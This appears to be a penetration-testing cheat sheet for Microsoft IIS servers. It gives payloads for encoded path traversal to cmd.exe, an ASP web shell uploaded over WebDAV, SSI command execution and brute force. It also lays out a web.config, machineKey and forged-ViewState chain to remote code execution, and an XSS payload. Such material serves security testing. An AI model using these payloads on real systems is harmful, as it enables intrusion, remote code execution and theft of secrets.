# IIS (Internet Information Services) Security Testing

## Overview
Security testing for Microsoft IIS web server including path traversal, authentication bypass, and configuration vulnerabilities.

## Reconnaissance
```
# IIS detection
curl -I https://target.com
# Server: Microsoft-IIS/10.0
# X-Powered-By: ASP.NET
# X-AspNet-Version: 4.x

# Version specific vulnerabilities
IIS 6.0 → Windows Server 2003 (very old, many CVEs)
IIS 7.x → Windows Server 2008
IIS 8.x → Windows Server 2012
IIS 10.0 → Windows Server 2016/2019

# WebDAV detection
OPTIONS / HTTP/1.1 → check Allow header for PUT, PROPFIND, etc.
```

## Path Traversal & Short Name (8.3) Enumeration
```
# IIS Tilde (~) vulnerability - enumerate short filenames
# Works on older IIS (<=8.5) or misconfigured newer
GET /a~1 HTTP/1.1  → 404 if no file, 400 if file exists starting with 'a'
GET /ab~1 HTTP/1.1

# Tool: IIS Short Name Scanner
java -jar iis_shortname_scanner.jar 2 20 https://target.com/

# Discover hidden files/directories:
# If /secret_config_file.xml exists → /secre~1.xml gives 400
```

## Unicode/Double Encoding Path Traversal
```
# IIS 5.x/6.x specific
# Unicode traversal (CVE-2001-0333)
GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir
GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir
GET /%c0%ae%c0%ae/%c0%ae%c0%ae/winnt/system32/cmd.exe

# Double encoding
GET /..%255c..%255c..%255cwinnt%255csystem32%255ccmd.exe

# Modern IIS: less likely but test:
..%2F..%2F..%2Fwindows/win.ini
..%5c..%5c..%5cwindows/win.ini
```

## Authentication Bypass

### NTLM Authentication Bypass
```
# Test for NTLM authentication
curl -I https://target.com/ 
# WWW-Authenticate: NTLM or Negotiate

# Relay attacks (in network context)
# NTLM reflection: CVE-2019-1040

# Test basic auth brute force
hydra -L users.txt -P passwords.txt https://target.com http-get /admin
```

### WebDAV Authentication Bypass
```
# If WebDAV enabled:
OPTIONS /webdav/ HTTP/1.1
# Check: PROPFIND, PUT, DELETE in Allow header

# Unauthenticated file write:
PUT /shell.asp HTTP/1.1
Content-Length: XX
<%eval request("cmd")%>

# Or MOVE existing file:
COPY /robots.txt HTTP/1.1
Destination: /shell.asp
```

## ASP/ASPX Vulnerabilities
```
# File extension bypass for code execution
shell.asp → shell.asp;.jpg → shell.asp:.jpg (NTFS alternate data stream)
shell.aspx → shell.aspx.
shell.cer, shell.asa (alternative script extensions IIS may execute)

# ViewState without MAC → deserialization
# See deserialization.md

# ASP classic → shell upload if webshell allowed
# ASPX trace enabled: /?trace.axd or /trace.axd
GET /trace.axd → .NET trace information

# Elmah.axd (error log)
GET /elmah.axd → exposed .NET error logs
```

## IIS Buffer Overflow / Known CVEs
```
# CVE-2021-31166: HTTP Protocol Stack RCE (IIS 10 on Windows 10)
# CVE-2017-7269: WebDAV RCE in IIS 6.0 (EternalBlue adjacent)
# CVE-2015-1635: HTTP.sys RCE (MS15-034) — Range header overflow

# MS15-034 test:
GET / HTTP/1.1
Host: target.com
Range: bytes=0-18446744073709551615
# If "Requested Range Not Satisfiable" → patched
# If crash/different response → vulnerable
```

## Sensitive File Exposure
```
# IIS default files
/iisstart.htm, /welcome.png
/aspnet_client/
/web.config → ASP.NET configuration (should be blocked)

# Backup files IIS might expose
/web.config.bak, /web.config~, /.web.config

# Error pages with version info
# Disabled custom error pages → detailed IIS errors
```

## IIS Handler Mapping Attacks
```
# Some file extensions handled by CGI/scripts
# .shtml → Server-Side Includes
# .asp, .aspx, .ashx, .asmx, .axd → ASP.NET

# Test if old handlers enabled:
/file.shtm, /file.stm → Server-Side Includes
<!--#exec cmd="dir"-->
<!--#include file="c:\boot.ini"-->
```

## Testing Methodology
1. Identify IIS version via headers
2. Test tilde enumeration (8.3 short names)
3. Test WebDAV (OPTIONS request)
4. Check for exposed .NET files (trace.axd, elmah.axd)
5. Test path traversal via encoding
6. Check web.config accessibility
7. Test for known CVEs based on version
8. Test authentication endpoints (NTLM, forms)
9. Test file upload restrictions

## Tools
- `IIS Short Name Scanner`
- `nuclei -t iis/` templates
- `nikto` for common misconfigurations
- Burp Suite for manual testing


## Additional Techniques — ported from WebSkills (websockets-iis-test)

### HTTPAPI 2.0 404 → Cert CN → VHost Hopping

A bare `HTTPAPI/2.0` 404 (kernel HTTP.sys default) means no site matched the `Host` header — it is not a dead end:
1. Read the TLS certificate CN/SAN of the IP → real hostname (e.g., `apply.company.com`).
2. Set `Host:` to that name → the app appears.
3. Enumerate other virtual hosts on the same IP with `ffuf`/Burp Intruder fuzzing the `Host:` header → reach forgotten/internal sites (e.g., `mssql.company.com`, `admin.company.com`).

### Additional Fingerprint Signals

- Cookies: `.ASPXAUTH`, `__RequestVerificationToken` (alongside `ASP.NET_SessionId`).
- HTML: `__EVENTVALIDATION`, `__EVENTTARGET`, `__VIEWSTATEGENERATOR` hidden inputs.
- Cookieless session/routing segments in the path: `(S(...))` and `(A(...))`.
- `.axd` handlers (`WebResource.axd`, `ScriptResource.axd`) confirm ASP.NET (padding-oracle history on `ScriptResource.axd` `d=`).
- Shodan: `http.title:"IIS"`, `ssl.cert.subject.CN:"company.in" http.title:"IIS"`.

### Short-Name Pipeline: shortscan → crunch → ffuf

8.3 tilde enum only leaks the first ~6 chars + 3-char extension; recover the rest:
```bash
shortscan https://apply.company.com/                       # get partial names (e.g. LIDSDI)
./crunch 0 3 abcdefghijklmnopqrstuvwxyz0123456789 -o 3char.txt
ffuf -w 3char.txt -D -e asp,aspx,ashx,asmx,wsdl,wadl,xml,zip,txt -t 100 -c \
  -u https://apply.company.com/lidsFUZZ
nuclei -u https://target -t fuzzing/iis-shortname.yaml
```
Always brute `.zip`/`.txt`/`.bak` — leaked backups/DLL archives are where source and secrets fall out.

### LFD Chain: web.config → machineKey → ViewState RCE

A file-download/traversal primitive on an IIS app is the gateway to RCE:
```
DownloadCategoryExcel?fileName=../../web.config      → <machineKey validationKey= decryptionKey=>
DownloadCategoryExcel?fileName=../../global.asax     → learn DLL names (<add namespace="Company.Web.Api.dll"/>)
DownloadCategoryExcel?fileName=../../bin/Company.Web.Api.dll  → download binary → decompile
```
Then forge a malicious `__VIEWSTATE`:
- If **ViewState MAC is disabled** → forge with no key needed.
- If MAC enabled but you hold the `validationKey` (+`decryptionKey` when encrypted) → forge a MAC-valid payload carrying a deserialization gadget → RCE.
```bash
viewgen --webconfig web.config -m <__VIEWSTATEGENERATOR> -c "ping <collaborator>"
# ysoserial.net (ViewState plugin) is the canonical gadget companion
```
Grab the **whole `<machineKey>` element verbatim** (both keys + algs). ASP.NET Core does not use ViewState.

### DLL Decompilation

Leaked `.dll`/`.exe` (often inside `.zip` backups) decompile near-to-source with **dnSpy** (decompile + debug), **dotPeek**, or **ILSpy**. Grep output for `machineKey`, `validationKey`, `decryptionKey`, `connectionString`, `ApiKey`, `secret`, `Bearer`, internal hostnames, and `[Route(...)]` maps → feed machineKeys straight into viewgen.

### ASP.NET Cookieless-Routing XSS

`(A(...))`/`(S(...))` segments are parsed as cookieless auth/session tokens and stripped during canonicalization, but the reflected value can survive unencoded (image bases like `~/images/`, redirects, `returnUrl`, self-post `action`):
```
/(A(%22onerror='alert%60123%60'test))/
```
Test on login pages, redirects, and dynamic URL construction; vary encoding (`%2522`, mixed case) if filtered.

### Extensions to Brute

`.aspx .ashx .asmx .wsdl .wadl .axd .xml .zip .txt .bak` — the `.wsdl`/`.asmx` hits expose web services; `.zip`/`.bak` expose source/backups.

### False-Positive Guards

`web.config` returning 404 is IIS's default static-file block, not disclosure — confirm actual `<configuration>` XML is returned. `__VIEWSTATE` present ≠ RCE — confirm MAC disabled or machineKey known. DLL "leak" must be a valid PE (`MZ` header) that decompiles.
